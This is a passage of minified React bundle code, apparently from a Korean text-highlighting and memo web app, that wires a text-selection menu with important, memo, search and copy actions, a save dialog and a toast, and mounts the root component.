저장됩니다"})]})]}),u.jsx(u0,{isActive:q,onToggle:()=>b(!q)}),u.jsx(m0,{isActive:q,onTextSelected:ft}),u.jsx(v0,{selectedText:M?.text,position:M?.position,onImportant:qt,onMemo:Tt,onSearch:_,onCopy:O,onClose:()=>D(null)}),me&&u.jsx(E0,{selectedText:Be,onSave:et,onClose:()=>xe(!1)}),H&&u.jsx(S0,{message:H.message,type:H.type,onClose:()=>ne(null)})]})}s0.createRoot(document.getElementById("root")).render(u.jsx(Ne.StrictMode,{children:u.jsx(D0,{})}));
